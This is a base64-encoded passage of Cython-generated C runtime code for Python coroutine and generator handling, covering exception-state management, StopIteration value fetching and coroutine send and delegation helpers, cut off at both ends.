1xuICAgICAgICAgICAgUHlUdXBsZV9TRVRfSVRFTShhcmdzX3R1cGxlLCAwLCB2YWx1ZSk7XG4gICAgICAgICAgICBleGMgPSBQeU9iamVjdF9DYWxsKGV4Y190eXBlLCBhcmdzX3R1cGxlLCBOVUxMKTtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihhcmdzX3R1cGxlKTtcbiAgICAgICAgfVxuICAgICAgICBpZiAodW5saWtlbHkoIWV4YykpIHJldHVybjtcbiAgICB9IGVsc2Uge1xuICAgICAgICBQeV9JTkNSRUYodmFsdWUpO1xuICAgICAgICBleGMgPSB2YWx1ZTtcbiAgICB9XG4gICAgI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURVxuICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduXG4gICAgI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0tcbiAgICBpZiAoIV9fcHl4X3RzdGF0ZS0+ZXhjX2luZm8tPmV4Y192YWx1ZSlcbiAgICAjZWxzZVxuICAgIGlmICghX19weXhfdHN0YXRlLT5leGNfdHlwZSlcbiAgICAjZW5kaWZcbiAgICB7XG4gICAgICAgIFB5X0lOQ1JFRihleGNfdHlwZSk7XG4gICAgICAgIF9fUHl4X0VyclJlc3RvcmUoZXhjX3R5cGUsIGV4YywgTlVMTCk7XG4gICAgICAgIHJldHVybjtcbiAgICB9XG4gICAgI2VuZGlmXG4jZWxzZVxuICAgIGV4YyA9IF9fUHl4X1B5T2JqZWN0X0NhbGxPbmVBcmcoZXhjX3R5cGUsIHZhbHVlKTtcbiAgICBpZiAodW5saWtlbHkoIWV4YykpIHJldHVybjtcbiNlbmRpZlxuICAgIFB5RXJyX1NldE9iamVjdChleGNfdHlwZSwgZXhjKTtcbiAgICBQeV9ERUNSRUYoZXhjKTtcbn1cblxuXG4jaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiNpbmNsdWRlIDxmcmFtZW9iamVjdC5oPlxuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwYjAwYTYgJiYgIWRlZmluZWQoUFlQWV9WRVJTSU9OKVxuICAjaWZuZGVmIFB5X0JVSUxEX0NPUkVcbiAgICAjZGVmaW5lIFB5X0JVSUxEX0NPUkUgMVxuICAjZW5kaWZcbiAgI2luY2x1ZGUgImludGVybmFsL3B5Y29yZV9mcmFtZS5oIlxuI2VuZGlmXG4jZW5kaWYgLy8gQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZFxuX19QeXhfQ29yb3V0aW5lX1VuZGVsZWdhdGUoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4pIHtcbiNpZiBDWVRIT05fVVNFX0FNX1NFTkRcbiAgICBnZW4tPnlpZWxkZnJvbV9hbV9zZW5kID0gTlVMTDtcbiNlbmRpZlxuICAgIFB5X0NMRUFSKGdlbi0+eWllbGRmcm9tKTtcbn1cbnN0YXRpYyBpbnQgX19QeXhfUHlHZW5fX0ZldGNoU3RvcEl0ZXJhdGlvblZhbHVlKFB5VGhyZWFkU3RhdGUgKl9fcHl4X3RzdGF0ZSwgUHlPYmplY3QgKipwdmFsdWUpIHtcbiAgICBQeU9iamVjdCAqZXQsICpldiwgKnRiO1xuICAgIFB5T2JqZWN0ICp2YWx1ZSA9IE5VTEw7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoX19weXhfdHN0YXRlKTtcbiAgICBfX1B5eF9FcnJGZXRjaCgmZXQsICZldiwgJnRiKTtcbiAgICBpZiAoIWV0KSB7XG4gICAgICAgIFB5X1hERUNSRUYodGIpO1xuICAgICAgICBQeV9YREVDUkVGKGV2KTtcbiAgICAgICAgUHlfSU5DUkVGKFB5X05vbmUpO1xuICAgICAgICAqcHZhbHVlID0gUHlfTm9uZTtcbiAgICAgICAgcmV0dXJuIDA7XG4gICAgfVxuICAgIGlmIChsaWtlbHkoZXQgPT0gUHlFeGNfU3RvcEl0ZXJhdGlvbikpIHtcbiAgICAgICAgaWYgKCFldikge1xuICAgICAgICAgICAgUHlfSU5DUkVGKFB5X05vbmUpO1xuICAgICAgICAgICAgdmFsdWUgPSBQeV9Ob25lO1xuICAgICAgICB9XG4gICAgICAgIGVsc2UgaWYgKGxpa2VseShfX1B5eF9JU19UWVBFKGV2LCAoUHlUeXBlT2JqZWN0KilQeUV4Y19TdG9wSXRlcmF0aW9uKSkpIHtcbiAgICAgICAgICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUxcbiAgICAgICAgICAgIHZhbHVlID0gUHlPYmplY3RfR2V0QXR0cihldiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3ZhbHVlKTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghdmFsdWUpKSBnb3RvIGxpbWl0ZWRfYXBpX2ZhaWx1cmU7XG4gICAgICAgICAgICAjZWxzZVxuICAgICAgICAgICAgdmFsdWUgPSAoKFB5U3RvcEl0ZXJhdGlvbk9iamVjdCAqKWV2KS0+dmFsdWU7XG4gICAgICAgICAgICBQeV9JTkNSRUYodmFsdWUpO1xuICAgICAgICAgICAgI2VuZGlmXG4gICAgICAgICAgICBQeV9ERUNSRUYoZXYpO1xuICAgICAgICB9XG4gICAgICAgIGVsc2UgaWYgKHVubGlrZWx5KFB5VHVwbGVfQ2hlY2soZXYpKSkge1xuICAgICAgICAgICAgUHlfc3NpemVfdCB0dXBsZV9zaXplID0gX19QeXhfUHlUdXBsZV9HRVRfU0laRShldik7XG4gICAgICAgICAgICAjaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gICAgICAgICAgICBpZiAodW5saWtlbHkodHVwbGVfc2l6ZSA8IDApKSB7XG4gICAgICAgICAgICAgICAgUHlfWERFQ1JFRih0Yik7XG4gICAgICAgICAgICAgICAgUHlfREVDUkVGKGV2KTtcbiAgICAgICAgICAgICAgICBQeV9ERUNSRUYoZXQpO1xuICAgICAgICAgICAgICAgIHJldHVybiAtMTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgICNlbmRpZlxuICAgICAgICAgICAgaWYgKHR1cGxlX3NpemUgPj0gMSkge1xuI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgICAgICAgICAgICAgdmFsdWUgPSBQeVR1cGxlX0dFVF9JVEVNKGV2LCAwKTtcbiAgICAgICAgICAgICAgICBQeV9JTkNSRUYodmFsdWUpO1xuI2VsaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPU1xuICAgICAgICAgICAgICAgIHZhbHVlID0gUHlTZXF1ZW5jZV9JVEVNKGV2LCAwKTtcbiNlbHNlXG4gICAgICAgICAgICAgICAgdmFsdWUgPSBQeVNlcXVlbmNlX0dldEl0ZW0oZXYsIDApO1xuICAgICAgICAgICAgICAgIGlmICghdmFsdWUpIGdvdG8gbGltaXRlZF9hcGlfZmFpbHVyZTtcbiNlbmRpZlxuICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICBQeV9JTkNSRUYoUHlfTm9uZSk7XG4gICAgICAgICAgICAgICAgdmFsdWUgPSBQeV9Ob25lO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgUHlfREVDUkVGKGV2KTtcbiAgICAgICAgfVxuICAgICAgICBlbHNlIGlmICghX19QeXhfVHlwZUNoZWNrKGV2LCAoUHlUeXBlT2JqZWN0KilQeUV4Y19TdG9wSXRlcmF0aW9uKSkge1xuICAgICAgICAgICAgdmFsdWUgPSBldjtcbiAgICAgICAgfVxuICAgICAgICBpZiAobGlrZWx5KHZhbHVlKSkge1xuICAgICAgICAgICAgUHlfWERFQ1JFRih0Yik7XG4gICAgICAgICAgICBQeV9ERUNSRUYoZXQpO1xuICAgICAgICAgICAgKnB2YWx1ZSA9IHZhbHVlO1xuICAgICAgICAgICAgcmV0dXJuIDA7XG4gICAgICAgIH1cbiAgICB9IGVsc2UgaWYgKCFfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoZXQsIFB5RXhjX1N0b3BJdGVyYXRpb24pKSB7XG4gICAgICAgIF9fUHl4X0VyclJlc3RvcmUoZXQsIGV2LCB0Yik7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgUHlFcnJfTm9ybWFsaXplRXhjZXB0aW9uKCZldCwgJmV2LCAmdGIpO1xuICAgIGlmICh1bmxpa2VseSghUHlPYmplY3RfVHlwZUNoZWNrKGV2LCAoUHlUeXBlT2JqZWN0KilQeUV4Y19TdG9wSXRlcmF0aW9uKSkpIHtcbiAgICAgICAgX19QeXhfRXJyUmVzdG9yZShldCwgZXYsIHRiKTtcbiAgICAgICAgcmV0dXJuIC0xO1xuICAgIH1cbiAgICBQeV9YREVDUkVGKHRiKTtcbiAgICBQeV9ERUNSRUYoZXQpO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICB2YWx1ZSA9IFB5T2JqZWN0X0dldEF0dHIoZXYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV92YWx1ZSk7XG4jZWxzZVxuICAgIHZhbHVlID0gKChQeVN0b3BJdGVyYXRpb25PYmplY3QgKilldiktPnZhbHVlO1xuICAgIFB5X0lOQ1JFRih2YWx1ZSk7XG4jZW5kaWZcbiAgICBQeV9ERUNSRUYoZXYpO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBpZiAodW5saWtlbHkoIXZhbHVlKSkgcmV0dXJuIC0xO1xuI2VuZGlmXG4gICAgKnB2YWx1ZSA9IHZhbHVlO1xuICAgIHJldHVybiAwO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9HUkFBTCB8fCAhQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPU1xuICBsaW1pdGVkX2FwaV9mYWlsdXJlOlxuICAgIFB5X1hERUNSRUYoZXQpO1xuICAgIFB5X1hERUNSRUYodGIpO1xuICAgIFB5X1hERUNSRUYoZXYpO1xuICAgIHJldHVybiAtMTtcbiNlbmRpZlxufVxuc3RhdGljIENZVEhPTl9JTkxJTkVcbl9fUHl4X1B5U2VuZFJlc3VsdCBfX1B5eF9Db3JvdXRpbmVfc3RhdHVzX2Zyb21fcmVzdWx0KFB5T2JqZWN0ICoqcmV0dmFsKSB7XG4gICAgaWYgKCpyZXR2YWwpIHtcbiAgICAgICAgcmV0dXJuIFBZR0VOX05FWFQ7XG4gICAgfSBlbHNlIGlmIChsaWtlbHkoX19QeXhfUHlHZW5fX0ZldGNoU3RvcEl0ZXJhdGlvblZhbHVlKF9fUHl4X1B5VGhyZWFkU3RhdGVfQ3VycmVudCwgcmV0dmFsKSA9PSAwKSkge1xuICAgICAgICByZXR1cm4gUFlHRU5fUkVUVVJOO1xuICAgIH0gZWxzZSB7XG4gICAgICAgIHJldHVybiBQWUdFTl9FUlJPUjtcbiAgICB9XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORVxudm9pZCBfX1B5eF9Db3JvdXRpbmVfRXhjZXB0aW9uQ2xlYXIoX19QeXhfRXhjSW5mb1N0cnVjdCAqZXhjX3N0YXRlKSB7XG4jaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNFxuICAgIFB5X0NMRUFSKGV4Y19zdGF0ZS0+ZXhjX3ZhbHVlKTtcbiNlbHNlXG4gICAgUHlPYmplY3QgKnQsICp2LCAqdGI7XG4gICAgdCA9IGV4Y19zdGF0ZS0+ZXhjX3R5cGU7XG4gICAgdiA9IGV4Y19zdGF0ZS0+ZXhjX3ZhbHVlO1xuICAgIHRiID0gZXhjX3N0YXRlLT5leGNfdHJhY2ViYWNrO1xuICAgIGV4Y19zdGF0ZS0+ZXhjX3R5cGUgPSBOVUxMO1xuICAgIGV4Y19zdGF0ZS0+ZXhjX3ZhbHVlID0gTlVMTDtcbiAgICBleGNfc3RhdGUtPmV4Y190cmFjZWJhY2sgPSBOVUxMO1xuICAgIFB5X1hERUNSRUYodCk7XG4gICAgUHlfWERFQ1JFRih2KTtcbiAgICBQeV9YREVDUkVGKHRiKTtcbiNlbmRpZlxufVxuI2RlZmluZSBfX1B5eF9Db3JvdXRpbmVfQWxyZWFkeVJ1bm5pbmdFcnJvcihnZW4pICAoX19QeXhfX0Nvcm91dGluZV9BbHJlYWR5UnVubmluZ0Vycm9yKGdlbiksIChQeU9iamVjdCopTlVMTClcbnN0YXRpYyB2b2lkIF9fUHl4X19Db3JvdXRpbmVfQWxyZWFkeVJ1bm5pbmdFcnJvcihfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbikge1xuICAgIGNvbnN0IGNoYXIgKm1zZztcbiAgICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUihnZW4pO1xuICAgIGlmICgoMCkpIHtcbiAgICAjaWZkZWYgX19QeXhfQ29yb3V0aW5lX1VTRURcbiAgICB9IGVsc2UgaWYgKF9fUHl4X0Nvcm91dGluZV9DaGVjaygoUHlPYmplY3QqKWdlbikpIHtcbiAgICAgICAgbXNnID0gImNvcm91dGluZSBhbHJlYWR5IGV4ZWN1dGluZyI7XG4gICAgI2VuZGlmXG4gICAgI2lmZGVmIF9fUHl4X0FzeW5jR2VuX1VTRURcbiAgICB9IGVsc2UgaWYgKF9fUHl4X0FzeW5jR2VuX0NoZWNrRXhhY3QoKFB5T2JqZWN0KilnZW4pKSB7XG4gICAgICAgIG1zZyA9ICJhc3luYyBnZW5lcmF0b3IgYWxyZWFkeSBleGVjdXRpbmciO1xuICAgICNlbmRpZlxuICAgIH0gZWxzZSB7XG4gICAgICAgIG1zZyA9ICJnZW5lcmF0b3IgYWxyZWFkeSBleGVjdXRpbmciO1xuICAgIH1cbiAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVmFsdWVFcnJvciwgbXNnKTtcbn1cbnN0YXRpYyB2b2lkIF9fUHl4X0Nvcm91dGluZV9BbHJlYWR5VGVybWluYXRlZEVycm9yKFB5T2JqZWN0ICpnZW4sIFB5T2JqZWN0ICp2YWx1ZSwgaW50IGNsb3NpbmcpIHtcbiAgICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUihnZW4pO1xuICAgIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKGNsb3NpbmcpO1xuICAgICNpZmRlZiBfX1B5eF9Db3JvdXRpbmVfVVNFRFxuICAgIGlmICghY2xvc2luZyAmJiBfX1B5eF9Db3JvdXRpbmVfQ2hlY2soZ2VuKSkge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfUnVudGltZUVycm9yLCAiY2Fubm90IHJldXNlIGFscmVhZHkgYXdhaXRlZCBjb3JvdXRpbmUiKTtcbiAgICB9IGVsc2VcbiAgICAjZW5kaWZcbiAgICBpZiAodmFsdWUpIHtcbiAgICAgICAgI2lmZGVmIF9fUHl4X0FzeW5jR2VuX1VTRURcbiAgICAgICAgaWYgKF9fUHl4X0FzeW5jR2VuX0NoZWNrRXhhY3QoZ2VuKSlcbiAgICAgICAgICAgIFB5RXJyX1NldE5vbmUoUHlFeGNfU3RvcEFzeW5jSXRlcmF0aW9uKTtcbiAgICAgICAgZWxzZVxuICAgICAgICAjZW5kaWZcbiAgICAgICAgUHlFcnJfU2V0Tm9uZShQeUV4Y19TdG9wSXRlcmF0aW9uKTtcbiAgICB9XG59XG5zdGF0aWNcbl9fUHl4X1B5U2VuZFJlc3VsdCBfX1B5eF9Db3JvdXRpbmVfU2VuZEV4KF9fcHl4X0Nvcm91dGluZU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqKnJlc3VsdCwgaW50IGNsb3NpbmcpIHtcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICBQeVRocmVhZFN0YXRlICp0c3RhdGU7XG4gICAgX19QeXhfRXhjSW5mb1N0cnVjdCAqZXhjX3N0YXRlO1xuICAgIFB5T2JqZWN0ICpyZXR2YWw7XG4gICAgYXNzZXJ0KF9fUHl4X0Nvcm91dGluZV9nZXRfaXNfcnVubmluZyhzZWxmKSk7ICAvLyBDYWxsZXJzIHNob3VsZCBlbnN1cmUgaXNfcnVubmluZ1xuICAgIGlmICh1bmxpa2VseShzZWxmLT5yZXN1bWVfbGFiZWwgPT0gLTEpKSB7XG4gICAgICAgIF9fUHl4X0Nvcm91dGluZV9BbHJlYWR5VGVybWluYXRlZEVycm9yKChQeU9iamVjdCopc2VsZiwgdmFsdWUsIGNsb3NpbmcpO1xuICAgICAgICByZXR1cm4gUFlHRU5fRVJST1I7XG4gICAgfVxuI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURVxuICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduXG4gICAgdHN0YXRlID0gX19weXhfdHN0YXRlO1xuI2Vsc2VcbiAgICB0c3RhdGUgPSBfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQ7XG4jZW5kaWZcbiAgICBleGNfc3RhdGUgPSAmc2VsZi0+Z2lfZXhjX3N0YXRlO1xuICAgIGlmIChleGNfc3RhdGUtPmV4Y192YWx1ZSkge1xuICAgICAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFlcbiAgICAgICAgI2Vsc2VcbiAgICAgICAgUHlPYmplY3QgKmV4Y190YjtcbiAgICAgICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQjAwYTQgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuICAgICAgICBleGNfdGIgPSBQeUV4Y2VwdGlvbl9HZXRUcmFjZWJhY2soZXhjX3N0YXRlLT5leGNfdmFsdWUpO1xuICAgICAgICAjZWxpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMGE0XG4gICAgICAgIGV4Y190YiA9ICgoUHlCYXNlRXhjZXB0aW9uT2JqZWN0KikgZXhjX3N0YXRlLT5leGNfdmFsdWUpLT50cmFjZWJhY2s7XG4gICAgICAgICNlbHNlXG4gICAgICAgIGV4Y190YiA9IGV4Y19zdGF0ZS0+ZXhjX3RyYWNlYmFjaztcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIGlmIChleGNfdGIpIHtcbiAgICAgICAgICAgIFB5VHJhY2ViYWNrT2JqZWN0ICp0YiA9IChQeVRyYWNlYmFja09iamVjdCAqKSBleGNfdGI7XG4gICAgICAgICAgICBQeUZyYW1lT2JqZWN0ICpmID0gdGItPnRiX2ZyYW1lO1xuICAgICAgICAgICAgYXNzZXJ0KGYtPmZfYmFjayA9PSBOVUxMKTtcbiAgICAgICAgICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMEExXG4gICAgICAgICAgICBmLT5mX2JhY2sgPSBQeVRocmVhZFN0YXRlX0dldEZyYW1lKHRzdGF0ZSk7XG4gICAgICAgICAgICAjZWxzZVxuICAgICAgICAgICAgUHlfWElOQ1JFRih0c3RhdGUtPmZyYW1lKTtcbiAgICAgICAgICAgIGYtPmZfYmFjayA9IHRzdGF0ZS0+ZnJhbWU7XG4gICAgICAgICAgICAjZW5kaWZcbiAgICAgICAgICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMGE0ICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbiAgICAgICAgICAgIFB5X0RFQ1JFRihleGNfdGIpO1xuICAgICAgICAgICAgI2VuZGlmXG4gICAgICAgIH1cbiAgICAgICAgI2VuZGlmXG4gICAgfVxuI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0tcbiAgICBleGNfc3RhdGUtPnByZXZpb3VzX2l0ZW0gPSB0c3RhdGUtPmV4Y19pbmZvO1xuICAgIHRzdGF0ZS0+ZXhjX2luZm8gPSBleGNfc3RhdGU7XG4jZWxzZVxuICAgIGlmIChleGNfc3RhdGUtPmV4Y190eXBlKSB7XG4gICAgICAgIF9fUHl4X0V4Y2VwdGlvblN3YXAoJmV4Y19zdGF0ZS0+ZXhjX3R5cGUsICZleGNfc3RhdGUtPmV4Y192YWx1ZSwgJmV4Y19zdGF0ZS0+ZXhjX3RyYWNlYmFjayk7XG4gICAgfSBlbHNlIHtcbiAgICAgICAgX19QeXhfQ29yb3V0aW5lX0V4Y2VwdGlvbkNsZWFyKGV4Y19zdGF0ZSk7XG4gICAgICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJmV4Y19zdGF0ZS0+ZXhjX3R5cGUsICZleGNfc3RhdGUtPmV4Y192YWx1ZSwgJmV4Y19zdGF0ZS0+ZXhjX3RyYWNlYmFjayk7XG4gICAgfVxuI2VuZGlmXG4gICAgcmV0dmFsID0gc2VsZi0+Ym9keShzZWxmLCB0c3RhdGUsIHZhbHVlKTtcbiNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLXG4gICAgZXhjX3N0YXRlID0gJnNlbGYtPmdpX2V4Y19zdGF0ZTtcbiAgICB0c3RhdGUtPmV4Y19pbmZvID0gZXhjX3N0YXRlLT5wcmV2aW91c19pdGVtO1xuICAgIGV4Y19zdGF0ZS0+cHJldmlvdXNfaXRlbSA9IE5VTEw7XG4gICAgX19QeXhfQ29yb3V0aW5lX1Jlc2V0RnJhbWVCYWNrcG9pbnRlcihleGNfc3RhdGUpO1xuI2VuZGlmXG4gICAgKnJlc3VsdCA9IHJldHZhbDtcbiAgICBpZiAoc2VsZi0+cmVzdW1lX2xhYmVsID09IC0xKSB7XG4gICAgICAgIHJldHVybiBsaWtlbHkocmV0dmFsKSA/IFBZR0VOX1JFVFVSTiA6IFBZR0VOX0VSUk9SO1xuICAgIH1cbiAgICByZXR1cm4gUFlHRU5fTkVYVDtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfQ29yb3V0aW5lX1Jlc2V0RnJhbWVCYWNrcG9pbnRlcihfX1B5eF9FeGNJbmZvU3RydWN0ICpleGNfc3RhdGUpIHtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIENZVEhPTl9VTlVTRURfVkFSKGV4Y19zdGF0ZSk7XG4jZWxzZVxuICAgIFB5T2JqZWN0ICpleGNfdGI7XG4gICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQjAwYTRcbiAgICBpZiAoIWV4Y19zdGF0ZS0+ZXhjX3ZhbHVlKSByZXR1cm47XG4gICAgZXhjX3RiID0gUHlFeGNlcHRpb25fR2V0VHJhY2ViYWNrKGV4Y19zdGF0ZS0+ZXhjX3ZhbHVlKTtcbiAgICAjZWxzZVxuICAgIGV4Y190YiA9IGV4Y19zdGF0ZS0+ZXhjX3RyYWNlYmFjaztcbiAgICAjZW5kaWZcbiAgICBpZiAobGlrZWx5KGV4Y190YikpIHtcbiAgICAgICAgUHlUcmFjZWJhY2tPYmplY3QgKnRiID0gKFB5VHJhY2ViYWNrT2JqZWN0ICopIGV4Y190YjtcbiAgICAgICAgUHlGcmFtZU9iamVjdCAqZiA9IHRiLT50Yl9mcmFtZTtcbiAgICAgICAgUHlfQ0xFQVIoZi0+Zl9iYWNrKTtcbiAgICAgICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQjAwYTRcbiAgICAgICAgUHlfREVDUkVGKGV4Y190Yik7XG4gICAgICAgICNlbmRpZlxuICAgIH1cbiNlbmRpZlxufVxuI2RlZmluZSBfX1B5eF9Db3JvdXRpbmVfTWV0aG9kUmV0dXJuRnJvbVJlc3VsdChnZW4sIHJlc3VsdCwgcmV0dmFsLCBpdGVybmV4dClcXFxuICAgICgocmVzdWx0KSA9PSBQWUdFTl9ORVhUID8gKHJldHZhbCkgOiBfX1B5eF9fQ29yb3V0aW5lX01ldGhvZFJldHVybkZyb21SZXN1bHQoZ2VuLCByZXN1bHQsIHJldHZhbCwgaXRlcm5leHQpKVxuc3RhdGljIFB5T2JqZWN0ICpcbl9fUHl4X19Db3JvdXRpbmVfTWV0aG9kUmV0dXJuRnJvbVJlc3VsdChQeU9iamVjdCogZ2VuLCBfX1B5eF9QeVNlbmRSZXN1bHQgcmVzdWx0LCBQeU9iamVjdCAqcmV0dmFsLCBpbnQgaXRlcm5leHQpIHtcbiAgICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUihnZW4pO1xuICAgIGlmIChsaWtlbHkocmVzdWx0ID09IFBZR0VOX1JFVFVSTikpIHtcbiAgICAgICAgaW50IGlzX2FzeW5jID0gMDtcbiAgICAgICAgI2lmZGVmIF9fUHl4X0FzeW5jR2VuX1VTRURcbiAgICAgICAgaXNfYXN5bmMgPSBfX1B5eF9Bc3luY0dlbl9DaGVja0V4YWN0KGdlbik7XG4gICAgICAgICNlbmRpZlxuICAgICAgICBfX1B5eF9SZXR1cm5XaXRoU3RvcEl0ZXJhdGlvbihyZXR2YWwsIGlzX2FzeW5jLCBpdGVybmV4dCk7XG4gICAgICAgIFB5X1hERUNSRUYocmV0dmFsKTtcbiAgICB9XG4gICAgcmV0dXJuIE5VTEw7XG59XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG5zdGF0aWMgQ1lUSE9OX0lOTElORVxuUHlPYmplY3QgKl9fUHl4X1B5R2VuX1NlbmQoUHlHZW5PYmplY3QgKmdlbiwgUHlPYmplY3QgKmFyZykge1xuI2lmIFBZX1ZFUlNJT05fSEVYIDw9IDB4MDMwQTAwQTFcbiAgICByZXR1cm4gX1B5R2VuX1NlbmQoZ2VuLCBhcmcpO1xuI2Vsc2VcbiAgICBQeU9iamVjdCAqcmVzdWx0O1xuICAgIGlmIChQeUl0ZXJfU2VuZCgoUHlPYmplY3QqKWdlbiwgYXJnID8gYXJnIDogUHlfTm9uZSwgJnJlc3VsdCkgPT0gUFlHRU5fUkVUVVJOKSB7XG4gICAgICAgIGlmIChQeUFzeW5jR2VuX0NoZWNrRXhhY3QoZ2VuKSkge1xuICAgICAgICAgICAgYXNzZXJ0KHJlc3VsdCA9PSBQeV9Ob25lKTtcbiAgICAgICAgICAgIFB5RXJyX1NldE5vbmUoUHlFeGNfU3RvcEFzeW5jSXRlcmF0aW9uKTtcbiAgICAgICAgfVxuICAgICAgICBlbHNlIGlmIChyZXN1bHQgPT0gUHlfTm9uZSkge1xuICAgICAgICAgICAgUHlFcnJfU2V0Tm9uZShQeUV4Y19TdG9wSXRlcmF0aW9uKTtcbiAgICAgICAgfVxuICAgICAgICBlbHNlIHtcbiNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwZDAwQTFcbiAgICAgICAgICAgIF9QeUdlbl9TZXRTdG9wSXRlcmF0aW9uVmFsdWUocmVzdWx0KTtcbiNlbHNlXG4gICAgICAgICAgICBpZiAoIVB5VHVwbGVfQ2hlY2socmVzdWx0KSAmJiAhUHlFeGNlcHRpb25JbnN0YW5jZV9DaGVjayhyZXN1bHQpKSB7XG4gICAgICAgICAgICAgICAgUHlFcnJfU2V0T2JqZWN0KFB5RXhjX1N0b3BJdGVyYXRpb24sIHJlc3VsdCk7XG4gICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpleGMgPSBfX1B5eF9QeU9iamVjdF9DYWxsT25lQXJnKFB5RXhjX1N0b3BJdGVyYXRpb24sIHJlc3VsdCk7XG4gICAgICAgICAgICAgICAgaWYgKGxpa2VseShleGMgIT0gTlVMTCkpIHtcbiAgICAgICAgICAgICAgICAgICAgUHlFcnJfU2V0T2JqZWN0KFB5RXhjX1N0b3BJdGVyYXRpb24sIGV4Yyk7XG4gICAgICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihleGMpO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH1cbiNlbmRpZlxuICAgICAgICB9XG4gICAgICAgIFB5X0RFQ1JFRihyZXN1bHQpO1xuICAgICAgICByZXN1bHQgPSBOVUxMO1xuICAgIH1cbiAgICByZXR1cm4gcmVzdWx0O1xuI2VuZGlmXG59XG4jZW5kaWZcbnN0YXRpYyBDWVRIT05fSU5MSU5FIF9fUHl4X1B5U2VuZFJlc3VsdFxuX19QeXhfQ29yb3V0aW5lX0ZpbmlzaERlbGVnYXRpb24oX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4sIFB5T2JqZWN0KiogcmV0dmFsKSB7XG4gICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdDtcbiAgICBQeU9iamVjdCAqdmFsID0gTlVMTDtcbiAgICBhc3NlcnQoX19QeXhfQ29yb3V0aW5lX2dldF9pc19ydW5uaW5nKGdlbikpO1xuICAgIF9fUHl4X0Nvcm91dGluZV9VbmRlbGVnYXRlKGdlbik7XG4gICAgX19QeXhfUHlHZW5fX0ZldGNoU3RvcEl0ZXJhdGlvblZhbHVlKF9fUHl4X1B5VGhyZWFkU3RhdGVfQ3VycmVudCwgJnZhbCk7XG4gICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX1NlbmRFeChnZW4sIHZhbCwgcmV0dmFsLCAwKTtcbiAgICBQeV9YREVDUkV